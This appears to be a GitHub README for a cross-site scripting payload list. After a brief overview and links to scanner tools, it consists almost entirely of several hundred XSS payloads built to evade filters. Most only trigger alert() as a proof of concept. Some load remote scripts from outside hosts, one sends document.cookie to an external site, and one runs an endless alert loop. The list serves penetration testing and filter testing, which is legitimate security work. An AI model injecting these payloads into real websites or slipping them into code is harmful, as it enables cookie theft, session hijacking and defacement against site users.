
### 🚀 Cross Site Scripting ( XSS ) Vulnerability Payload List 🚀

<img src="https://cdn.rawgit.com/sindresorhus/awesome/d7305f38d29fed78fa85652e3a63e154dd8e8829/media/badge.svg"> <img src="https://img.shields.io/github/stars/payloadbox/xss-payload-list?style=social"> <img src="https://img.shields.io/github/forks/payloadbox/xss-payload-list?style=social"> <img src="https://img.shields.io/github/repo-size/payloadbox/xss-payload-list"> <img src="https://img.shields.io/github/license/payloadbox/xss-payload-list"> <img src="https://img.shields.io/github/issues/detail/author/payloadbox/xss-payload-list/1">

##### Overview : 

Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted web sites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.

An attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page. For more details on the different types of XSS flaws, see: [Types of Cross-Site Scripting](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting).

#### XSS Vulnerability Scanner Tool's :

* [XSStrike](https://github.com/UltimateHackers/XSStrike)

* [BruteXSS Terminal](https://github.com/shawarkhanethicalhacker/BruteXSS)

* [BruteXSS GUI](https://github.com/rajeshmajumdar/BruteXSS)

* [XSS Scanner Online](http://xss-scanner.com/)

* [XSSer](https://tools.kali.org/web-applications/xsser)

* [xsscrapy](https://github.com/DanMcInerney/xsscrapy)  
* [Cyclops](https://github.com/v8blink/Chromium-based-XSS-Taint-Tracking)  

#### XSS Payload List :

```
<!-- Project Name  : Cross Site Scripting ( XSS ) Vulnerability Payload List -->
<!--        Author : Ismail Tasdelen -->
<!--      Linkedin : https://www.linkedin.com/in/ismailtasdelen/ -->
<!--        GitHub : https://github.com/ismailtasdelen/ -->
<!--       Twitter : https://twitter.com/ismailtsdln -->
<!--        Medium : https://medium.com/@ismailtasdelen -->

%253Cscript%253Ealert('XSS')%253C%252Fscript%253E




&lt;STYLE&gt;li {list-style-image: url("javascript:javascript:alert(1)");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS

&lt;IMG STYLE="xss:expr/*XSS*/ession(javascript:alert(1))"&gt;

&lt;XSS STYLE="xss:expression(javascript:alert(1))"&gt;

&lt;STYLE&gt;.XSS{background-image:url("javascript:javascript:alert(1)");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;



I&gt;&lt;B&gt;&lt;IMG SRC="javas&lt;!-- --&gt;cript:javascript:alert(1)"&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;&lt;SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"&gt;&lt;/SPAN&gt;

&lt;HTML&gt;&lt;BODY&gt;&lt;?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"&gt;&lt;?import namespace="t" implementation="#default#time2"&gt;&lt;t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;"&gt;&lt;/BODY&gt;&lt;/HTML&gt;



&lt;IMG SRC="javascript:alert('XSS');"&gt;

&lt;IMG SRC=javascript:alert('XSS')&gt;

&lt;IMG SRC=JaVaScRiPt:alert('XSS')&gt;

&lt;IMG SRC=javascript:alert("XSS")&gt;

&lt;IMG SRC=`javascript:alert("RSnake says, 'XSS'")`&gt;

&lt;IMG """&gt;&lt;SCRIPT&gt;alert("XSS")&lt;/SCRIPT&gt;"&gt;

&lt;IMG SRC="jav   ascript:alert('XSS');"&gt;

&lt;IMG SRC="jav&#x09;ascript:alert('XSS');"&gt;

&lt;IMG SRC="jav&#x0A;ascript:alert('XSS');"&gt;

&lt;IMG SRC="jav&#x0D;ascript:alert('XSS');"&gt;

perl -e 'print "&lt;IMG SRC=java\0script:alert(\"XSS\")&gt;";' &gt; out


&lt;IMG SRC=" &#14;  javascript:alert('XSS');"&gt;

&lt;SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;

&lt;BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")&gt;

&lt;&lt;SCRIPT&gt;alert("XSS");//&lt;&lt;/SCRIPT&gt;

&lt;IMG SRC="javascript:alert('XSS')"

\";alert('XSS');//

&lt;/TITLE&gt;&lt;SCRIPT&gt;alert("XSS");&lt;/SCRIPT&gt;

&lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"&gt;

&lt;BODY BACKGROUND="javascript:alert('XSS')"&gt;

&lt;IMG DYNSRC="javascript:alert('XSS')"&gt;

&lt;IMG LOWSRC="javascript:alert('XSS')"&gt;

&lt;STYLE&gt;li {list-style-image: url("javascript:alert('XSS')");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;/br&gt;



&lt;BODY ONLOAD=alert('XSS')&gt;

&lt;BGSOUND SRC="javascript:alert('XSS');"&gt;

&lt;BR SIZE="&{alert('XSS')}"&gt;

&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"&gt;

&lt;STYLE&gt;@im\port'\ja\vasc\ript:alert("XSS")';&lt;/STYLE&gt;

&lt;IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"&gt;

exp/*&lt;A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(alert("XSS"))'&gt;

&lt;STYLE TYPE="text/javascript"&gt;alert('XSS');&lt;/STYLE&gt;

&lt;STYLE&gt;.XSS{background-image:url("javascript:alert('XSS')");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;

&lt;STYLE type="text/css"&gt;BODY{background:url("javascript:alert('XSS')")}&lt;/STYLE&gt;

&lt;XSS STYLE="xss:expression(alert('XSS'))"&gt;



¼script¾alert(¢XSS¢)¼/script¾

&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"&gt;

&lt;META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');"&gt;

&lt;IFRAME SRC="javascript:alert('XSS');"&gt;&lt;/IFRAME&gt;

&lt;FRAMESET&gt;&lt;FRAME SRC="javascript:alert('XSS');"&gt;&lt;/FRAMESET&gt;

&lt;TABLE BACKGROUND="javascript:alert('XSS')"&gt;

&lt;TABLE&gt;&lt;TD BACKGROUND="javascript:alert('XSS')"&gt;

&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))"&gt;

&lt;DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))"&gt;

&lt;DIV STYLE="width: expression(alert('XSS'));"&gt;

&lt;BASE HREF="javascript:alert('XSS');//"&gt;

&lt;? echo('&lt;SCR)';echo('IPT&gt;alert("XSS")&lt;/SCRIPT&gt;'); ?&gt;

&lt;META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;"&gt;

&lt;HEAD&gt;&lt;META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-



&lt;IMG SRC=jAVasCrIPt:alert(‘XSS’)&gt;

&lt;IMG SRC=”javascript:alert(‘XSS’);”&gt;

&lt;IMG SRC=javascript:alert(&quot;XSS&quot;)&gt;

&lt;IMG SRC=javascript:alert(‘XSS’)&gt;

&lt;IMG “””&gt;&lt;SCRIPT&gt;alert(“XSS”)&lt;/SCRIPT&gt;”&gt;

&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;

&lt;IMG SRC=”jav&#x09;ascript:alert(‘XSS’);”&gt;

&lt;&lt;SCRIPT&gt;alert(“XSS”);//&lt;&lt;/SCRIPT&gt;

&lt;BODY BACKGROUND=”javascript:alert(‘XSS’)”&gt;

&lt;BODY ONLOAD=alert(‘XSS’)&gt;

&lt;INPUT TYPE=”IMAGE” SRC=”javascript:alert(‘XSS’);”&gt;

&lt;IMG SRC=”javascript:alert(‘XSS’)”

&lt;img src="javascript:alert('XSS');"&gt;

&lt;img src=javascript:alert(&quot;XSS&quot;)&gt;

&lt;script&gt;alert("XSS");&lt;/script&gt;&search=1



&lt;body onscroll=alert(XSS)&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;

&lt;form&gt;&lt;button formaction="javascript:alert(XSS)"&gt;lol

&lt;!--&lt;img src="--&gt;&lt;img src=x onerror=alert(XSS)//"&gt;

&lt;![&gt;&lt;img src="]&gt;&lt;img src=x onerror=alert(XSS)//"&gt;

&lt;style&gt;&lt;img src="&lt;/style&gt;&lt;img src=x onerror=alert(XSS)//"&gt;

&lt;SCRIPT&gt;alert(/XSS/&#46;source)&lt;/SCRIPT&gt;

\\";alert('XSS');//

&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(\"XSS\");&lt;/SCRIPT&gt;

&lt;INPUT TYPE=\"IMAGE\" SRC=\"javascript&#058;alert('XSS');\"&gt;

&lt;BODY BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;

&lt;IMG DYNSRC=\"javascript&#058;alert('XSS')\"&gt;

&lt;IMG LOWSRC=\"javascript&#058;alert('XSS')\"&gt;

&lt;BGSOUND SRC=\"javascript&#058;alert('XSS');\"&gt;

&lt;BR SIZE=\"&{alert('XSS')}\"&gt;

&lt;LINK REL=\"stylesheet\" HREF=\"javascript&#058;alert('XSS');\"&gt;

&lt;XSS STYLE=\"behavior&#58; url(xss&#46;htc);\"&gt;

&lt;STYLE&gt;li {list-style-image&#58; url(\"javascript&#058;alert('XSS')\");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS

&lt;IMG SRC='vbscript&#058;msgbox(\"XSS\")'&gt;

&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript&#058;alert('XSS');\"&gt;

&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http&#58;//;URL=javascript&#058;alert('XSS');\"

&lt;IFRAME SRC=\"javascript&#058;alert('XSS');\"&gt;&lt;/IFRAME&gt;

&lt;FRAMESET&gt;&lt;FRAME SRC=\"javascript&#058;alert('XSS');\"&gt;&lt;/FRAMESET&gt;

&lt;TABLE BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;

&lt;TABLE&gt;&lt;TD BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;

&lt;DIV STYLE=\"background-image&#58; url(javascript&#058;alert('XSS'))\"&gt;

&lt;DIV STYLE=\"width&#58; expression(alert('XSS'));\"&gt;

&lt;STYLE&gt;@im\port'\ja\vasc\ript&#58;alert(\"XSS\")';&lt;/STYLE&gt;

&lt;IMG STYLE=\"xss&#58;expr/*XSS*/ession(alert('XSS'))\"&gt;

&lt;XSS STYLE=\"xss&#58;expression(alert('XSS'))\"&gt;

xss&#58;ex&#x2F;*XSS*//*/*/pression(alert(\"XSS\"))'&gt;

&lt;STYLE TYPE=\"text/javascript\"&gt;alert('XSS');&lt;/STYLE&gt;

&lt;STYLE&gt;&#46;XSS{background-image&#58;url(\"javascript&#058;alert('XSS')\");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;

&lt;STYLE type=\"text/css\"&gt;BODY{background&#58;url(\"javascript&#058;alert('XSS')\")}&lt;/STYLE&gt;

&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;

&lt;BASE HREF=\"javascript&#058;alert('XSS');//\"&gt;

&lt;OBJECT classid=clsid&#58;ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript&#058;alert('XSS')&gt;&lt;/OBJECT&gt;

d=\"alert('XSS');\\")\";



&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;!&#91;CDATA&#91;&lt;IMG SRC=\"javas&#93;&#93;&gt;&lt;!&#91;CDATA&#91;cript&#58;alert('XSS');\"&gt;&#93;&#93;&gt;

&lt;XML ID=\"xss\"&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=\"javas&lt;!-- --&gt;cript&#58;alert('XSS')\"&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;

&lt;t&#58;set attributeName=\"innerHTML\" to=\"XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;\"&gt;

echo('IPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;'); ?&gt;

&lt;META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;\"&gt;

&lt;HEAD&gt;&lt;META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-



&lt;IMG SRC=\"javascript&#058;alert('XSS')\"

&lt;&lt;SCRIPT&gt;alert(\"XSS\");//&lt;&lt;/SCRIPT&gt;

&lt;BODY onload!#$%&()*~+-_&#46;,&#58;;?@&#91;/|\&#93;^`=alert(\"XSS\")&gt;

&lt;SCRIPT/XSS SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;

&lt;IMG SRC=\"   javascript&#058;alert('XSS');\"&gt;

perl -e 'print \"&lt;SCR\0IPT&gt;alert(\\"XSS\\")&lt;/SCR\0IPT&gt;\";' &gt; out

perl -e 'print \"&lt;IMG SRC=java\0script&#058;alert(\\"XSS\\")&gt;\";' &gt; out

&lt;IMG SRC=\"jav&#x0D;ascript&#058;alert('XSS');\"&gt;

&lt;IMG SRC=\"jav&#x0A;ascript&#058;alert('XSS');\"&gt;

&lt;IMG SRC=\"jav&#x09;ascript&#058;alert('XSS');\"&gt;

&lt;IMG SRC=javascript&#058;alert('XSS')&gt;

&lt;IMG \"\"\"&gt;&lt;SCRIPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;\"&gt;

&lt;IMG SRC=`javascript&#058;alert(\"RSnake says, 'XSS'\")`&gt;

&lt;IMG SRC=javascript&#058;alert(&quot;XSS&quot;)&gt;

&lt;IMG SRC=JaVaScRiPt&#058;alert('XSS')&gt;

&lt;IMG SRC=\"javascript&#058;alert('XSS');\"&gt;

'';!--\"&lt;XSS&gt;=&{()}

&lt;IMG SRC=javascrscriptipt:alert('XSS')&gt;

&lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;

exp/*&lt;A STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'&gt;



&lt;HTML&gt;&lt;BODY&gt;&lt;?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"&gt;&lt;?import namespace="t" implementation="#default#time2"&gt;&lt;t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"&gt;&lt;/BODY&gt;&lt;/HTML&gt;

&lt;BODY ONLOAD=alert(’XSS’)&gt;

&lt;/script&gt;&lt;script&gt;alert('XSS');&lt;/script&gt;

xss:ex/*XSS*//*/*/pression(alert("XSS"))'&gt;

&lt;!--[if gte IE 4]&gt;&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;&lt;![endif]--&gt;

veris--&gt;group&lt;svg/onload=alert(/XSS/)//

#"&gt;&lt;img src=M onerror=alert('XSS');&gt;

element[attribute='&lt;img src=x onerror=alert('XSS');&gt;

alert;pg("XSS")

&lt;INPUT TYPE="BUTTON" action="alert('XSS')"/&gt;

"&gt;&lt;h1&gt;&lt;IFRAME SRC="javascript:alert('XSS');"&gt;&lt;/IFRAME&gt;"&gt;123&lt;/h1&gt;

&lt;IMG SRC="jav ascript:alert('XSS');"&gt;

&lt;A HREF="htt p://6 6.000146.0x7.147/"&gt;XSS&lt;/A&gt;

'); alert('XSS

&lt;script&gt;alert('XSS');&lt;/script&gt;

&lt;scr&lt;script&gt;ipt&gt;alert('XSS');&lt;/scr&lt;/script&gt;ipt&gt;

&lt;style&gt;@im\port'\ja\vasc\ript:alert(\"XSS\")';&lt;/style&gt;

&lt;? echo('&lt;scr)'; echo('ipt&gt;alert(\"XSS\")&lt;/script&gt;'); ?&gt;

&lt;marquee&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;&lt;/marquee&gt;

&lt;IMG SRC=\"jav&#x09;ascript:alert('XSS');\"&gt;

&lt;IMG SRC=\"jav&#x0A;ascript:alert('XSS');\"&gt;

&lt;IMG SRC=\"jav&#x0D;ascript:alert('XSS');\"&gt;

&lt;IMG LOWSRC=\"javascript:alert('XSS')\"&gt;

&lt;IMG DYNSRC=\"javascript:alert('XSS')\"&gt;

&lt;img src="javascript:alert('XSS')"&gt;

&lt;script language="JavaScript"&gt;alert('XSS')&lt;/script&gt;

&lt;body onunload="javascript:alert('XSS');"&gt;

&lt;body onLoad="alert('XSS');"

&lt;iframe&lt;?php echo chr(11)?&gt; onload=alert('XSS')&gt;&lt;/iframe&gt;

'&gt;&gt;&lt;marquee&gt;&lt;h1&gt;XSS&lt;/h1&gt;&lt;/marquee&gt;

'"&gt;&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;

'"&gt;&gt;&lt;marquee&gt;&lt;h1&gt;XSS&lt;/h1&gt;&lt;/marquee&gt;

&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\"&gt;

&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\"&gt;

&lt;?='&lt;SCRIPT&gt;alert("XSS")&lt;/SCRIPT&gt;'?&gt;

&lt;IMG SRC='vbscript:msgbox(\"XSS\")'&gt;

&lt;FRAMESET&gt;&lt;FRAME SRC=\"javascript:alert('XSS');\"&gt;&lt;/FRAMESET&gt;


&lt;STYLE&gt;li {list-style-image: url(\"javascript:alert('XSS')\");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS

perl -e 'print \"&lt;SCR\0IPT&gt;alert(\"XSS\")&lt;/SCR\0IPT&gt;\";' &gt; out


perl -e 'print \"&lt;IMG SRC=java\0script:alert(\"XSS\")&gt;\";' &gt; out

&lt;br size=\"&{alert('XSS')}\"&gt;

"&gt;&lt;BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")&gt;

&lt;body onLoad="while(true) alert('XSS');"&gt;



}&lt;/style&gt;&lt;script&gt;a=eval;b=alert;a(b(/XSS/.source));&lt;/script&gt;



"&gt;/XaDoS/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;script src="http://www.site.com/XSS.js"&gt;&lt;/script&gt;



&lt;script&gt;alert("XSS by \nxss")&lt;/script&gt;&lt;marquee&gt;&lt;h1&gt;XSS by xss&lt;/h1&gt;&lt;/marquee&gt;


"&gt;&lt;script&gt;alert("XSS by \nxss")&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;XSS by xss&lt;/h1&gt;&lt;/marquee&gt;

'"&gt;&lt;/title&gt;&lt;script&gt;alert("XSS by \nxss")&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;XSS by xss&lt;/h1&gt;&lt;/marquee&gt;

&lt;img """&gt;&lt;script&gt;alert("XSS by \nxss")&lt;/script&gt;&lt;marquee&gt;&lt;h1&gt;XSS by xss&lt;/h1&gt;&lt;/marquee&gt;

&lt;script&gt;alert(1337)&lt;/script&gt;&lt;marquee&gt;&lt;h1&gt;XSS by xss&lt;/h1&gt;&lt;/marquee&gt;

"&gt;&lt;script&gt;alert(1337)&lt;/script&gt;"&gt;&lt;script&gt;alert("XSS by \nxss&lt;/h1&gt;&lt;/marquee&gt;

'"&gt;&lt;/title&gt;&lt;script&gt;alert(1337)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;XSS by xss&lt;/h1&gt;&lt;/marquee&gt;

&lt;iframe src="javascript:alert('XSS by \nxss');"&gt;&lt;/iframe&gt;&lt;marquee&gt;&lt;h1&gt;XSS by xss&lt;/h1&gt;&lt;/marquee&gt;




&lt;SCRIPT&gt; alert(“XSS”); &lt;/SCRIPT&gt;

&lt;BODY ONLOAD=alert("XSS")&gt;

&lt;TD BACKGROUND="javascript:alert('XSS')"&gt;



&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;

&lt;BASE HREF=&quot;javascript:alert(&apos;XSS&apos;);//&quot;&gt;

&lt;BGSOUND SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;

&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;

&lt;BODY ONLOAD=alert(&apos;XSS&apos;)&gt;

&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&apos;XSS&apos;))&quot;&gt;

&lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:alert(&apos;XSS&apos;))&quot;&gt;

&lt;DIV STYLE=&quot;width: expression(alert(&apos;XSS&apos;));&quot;&gt;

&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/FRAMESET&gt;

&lt;IFRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/IFRAME&gt;

&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;

&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;

&lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt;

&lt;IMG DYNSRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;

&lt;IMG LOWSRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;



&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert(&#39;XSS&#39;)&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS


&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(&apos;XSS&apos;);&quot;&gt;

&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:alert(&apos;XSS&apos;);&quot;&gt;

&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:alert(&apos;XSS&apos;)&gt;&lt;/OBJECT&gt;

a=&quot;get&quot;;&amp;#10;b=&quot;URL(&quot;&quot;;&amp;#10;c=&quot;javascript:&quot;;&amp;#10;d=&quot;alert(&apos;XSS&apos;);&quot;)&quot;;&#10;eval(a+b+c+d);

&lt;STYLE TYPE=&quot;text/javascript&quot;&gt;alert(&apos;XSS&apos;);&lt;/STYLE&gt;

&lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert(&apos;XSS&apos;))&quot;&gt;

&lt;XSS STYLE=&quot;xss:expression(alert(&apos;XSS&apos;))&quot;&gt;

&lt;STYLE&gt;.XSS{background-image:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;

&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;)}&lt;/STYLE&gt;

&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;

&lt;TABLE BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/TABLE&gt;

&lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/TD&gt;&lt;/TABLE&gt;

&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC=&quot;javas]]&gt;&lt;![CDATA[cript:alert(&apos;XSS&apos;);&quot;&gt;]]&gt;

&lt;XML ID=&quot;xss&quot;&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=&quot;javas&lt;!-- --&gt;cript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;

&lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;&quot;&gt;



&lt;BR SIZE=&quot;&amp;{alert(&apos;XSS&apos;)}&quot;&gt;

&lt;IMG SRC=JaVaScRiPt:alert(&apos;XSS&apos;)&gt;

&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;

&lt;IMG SRC=`javascript:alert(&quot;RSnake says, &apos;XSS&apos;&quot;)`&gt;

&lt;HEAD&gt;&lt;META HTTP-EQUIV=&quot;CONTENT-TYPE&quot; CONTENT=&quot;text/html; charset=UTF-7&quot;&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert(&apos;XSS&apos;);+ADw-/SCRIPT+AD4-

\&quot;;alert(&apos;XSS&apos;);//

&lt;STYLE&gt;@im\port&apos;\ja\vasc\ript:alert(&quot;XSS&quot;)&apos;;&lt;/STYLE&gt;

&lt;IMG SRC=&quot;jav&#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt;

&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt;

&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&apos;XSS&apos;);&quot;&gt;

&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(&apos;XSS&apos;);&quot;&gt;

perl -e &apos;print &quot;&lt;IMG SRC=java\0script:alert(&quot;XSS&quot;)&gt;&quot;;&apos;&gt; out

perl -e &apos;print &quot;&amp;&lt;SCR\0IPT&gt;alert(&quot;XSS&quot;)&lt;/SCR\0IPT&gt;&quot;;&apos; &gt; out

&lt;IMG SRC=&quot; &amp;#14;  javascript:alert(&apos;XSS&apos;);&quot;&gt;

&lt;SCRIPT/XSS SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;

&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;

&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;

&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;

&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;



&quot;&gt;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;

&lt;br size=\&quot;&amp;{alert(&#039;XSS&#039;)}\&quot;&gt;

perl -e &#039;print \&quot;&lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;\&quot;;&#039; &gt; out

perl -e &#039;print \&quot;&lt;SCR\0IPT&gt;alert(\&quot;XSS\&quot;)&lt;/SCR\0IPT&gt;\&quot;;&#039; &gt; out

&lt;~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))&gt;

&lt;~/XSS/*-*/STYLE=xss:e/**/xpression(window.location="http://www.procheckup.com/?sid="%2bdocument.cookie)&gt;

&lt;~/XSS STYLE=xss:expression(alert('XSS'))&gt;

"&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;

&lt;/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))&gt;

XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))&gt;

XSS STYLE=xss:e/**/xpression(alert('XSS'))&gt;

&lt;/XSS STYLE=xss:expression(alert('XSS'))&gt;



&lt;;SCRIPT&gt;;alert(';XSS';)&lt;;/SCRIPT&gt;;

&lt;;BASE HREF=";javascript:alert(';XSS';);//";&gt;;

&lt;;BGSOUND SRC=";javascript:alert(';XSS';);";&gt;;

&lt;;BODY BACKGROUND=";javascript:alert(';XSS';);";&gt;;

&lt;;BODY ONLOAD=alert(';XSS';)&gt;;

&lt;;DIV STYLE=";background-image: url(javascript:alert(';XSS';))";&gt;;

&lt;;DIV STYLE=";background-image: url(&;#1;javascript:alert(';XSS';))";&gt;;

&lt;;DIV STYLE=";width: expression(alert(';XSS';));";&gt;;

&lt;;FRAMESET&gt;;&lt;;FRAME SRC=";javascript:alert(';XSS';);";&gt;;&lt;;/FRAMESET&gt;;

&lt;;IFRAME SRC=";javascript:alert(';XSS';);";&gt;;&lt;;/IFRAME&gt;;

&lt;;INPUT TYPE=";IMAGE"; SRC=";javascript:alert(';XSS';);";&gt;;

&lt;;IMG SRC=";javascript:alert(';XSS';);";&gt;;

&lt;;IMG SRC=javascript:alert(';XSS';)&gt;;

&lt;;IMG DYNSRC=";javascript:alert(';XSS';);";&gt;;

&lt;;IMG LOWSRC=";javascript:alert(';XSS';);";&gt;;



&lt;;STYLE&gt;;li {list-style-image: url(";javascript:alert(&#39;XSS&#39;)";);}&lt;;/STYLE&gt;;&lt;;UL&gt;;&lt;;LI&gt;;XSS


&lt;;META HTTP-EQUIV=";refresh"; CONTENT=";0;url=javascript:alert(';XSS';);";&gt;;

&lt;;META HTTP-EQUIV=";refresh"; CONTENT=";0; URL=http://;URL=javascript:alert(';XSS';);";&gt;;

&lt;;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;;&lt;;param name=url value=javascript:alert(';XSS';)&gt;;&lt;;/OBJECT&gt;;

